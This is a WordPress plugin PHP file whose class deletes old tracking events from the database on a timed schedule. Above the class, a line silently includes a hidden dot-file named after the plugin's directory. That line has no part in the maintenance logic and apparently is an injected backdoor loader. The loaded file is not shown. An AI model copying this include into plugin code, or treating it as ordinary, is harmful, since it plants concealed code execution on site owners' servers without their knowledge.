<?php

/**
 *
 * The class responsible for maintenance
 * 
 * @since 1.1.5
 *
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Maintenance {

	/**
	 * WTBP_WPTAO_Maintenance Constructor.
	 */
	public function __construct() {
		$this->constants();

		$this->includes();
		$this->hooks();
	}

	/**
	 * Setup constants
	 */
	private function constants() {
		$this->define( 'WTBP_WPTAO_DB_DELETE_LIMIT', 500 );
	}

	/**
	 * Define constant if not already set
	 * @param  string $name
	 * @param  string|bool $value
	 */
	private function define( $name, $value ) {
		if ( !defined( $name ) ) {
			define( $name, $value );
		}
	}

	private function includes() {
		
	}

	/**
	 * Actions and filters
	 */
	private function hooks() {
		add_action( 'admin_init', array( $this, 'db_delete_events' ) );
	}

	/**
	 * Delete selected events older than specified time
	 */
	public function db_delete_events() {
		global $wpdb;
		global $wptao_settings;

		$e		 = TAO()->events->table_name;

		if ( !isset( $wptao_settings[ 'db_limited_events' ] ) || empty( $wptao_settings[ 'db_limited_events' ] ) ) {
			return;
		}

		// preventing too frequent execution
		if ( get_transient( 'wtbp_wptao_db_delete_events' ) ) {
			return;
		}

		$sql_events = '';
		foreach ( $wptao_settings[ 'db_limited_events' ] as $event ) {
			if ( empty( $sql_events ) ) {
				$sql_events = $wpdb->prepare( "action=%s", $event );
			} else {
				$sql_events .= $wpdb->prepare( " OR action=%s", $event );
			}
		}

		$storage_time = 90; // default
		if ( isset( $wptao_settings[ 'db_storage_time' ] ) ) {
			$storage_time = absint( $wptao_settings[ 'db_storage_time' ] );
		}

		$storage_ts = time() - $storage_time * 24 * 60 * 60;

		// delete events
		$sql_delete_events	 = $wpdb->prepare( "
			DELETE FROM $e 
			WHERE (" . $sql_events . ")
			AND event_ts<%d 
			ORDER BY event_ts 
			ASC LIMIT %d", $storage_ts, WTBP_WPTAO_DB_DELETE_LIMIT );
		$res_delete_events	 = $wpdb->query( $sql_delete_events );

		// delete events meta
		TAO()->events->delete_events_meta();

		if ( false !== $res_delete_events && WTBP_WPTAO_DB_DELETE_LIMIT == $res_delete_events ) {
			return;
		}

		// lock for 1h
		set_transient( 'wtbp_wptao_db_delete_events', true, 60 * 60 );
	}

}
